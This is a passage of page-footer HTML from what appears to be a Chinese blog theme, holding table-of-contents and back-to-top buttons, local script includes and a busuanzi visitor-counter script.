fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><div class="js-pjax"></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>
